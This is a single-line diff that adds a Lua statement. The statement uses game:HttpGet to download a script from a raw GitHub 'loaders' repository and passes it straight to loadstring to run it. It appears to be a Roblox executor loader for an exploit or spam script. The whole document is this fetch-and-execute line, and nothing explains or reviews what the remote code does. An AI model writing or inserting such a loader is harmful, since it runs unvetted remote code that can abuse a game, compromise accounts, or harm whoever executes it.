@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/sell-fries-anomaly-spam2-0rn5jhl3fimfo9.lua"))()
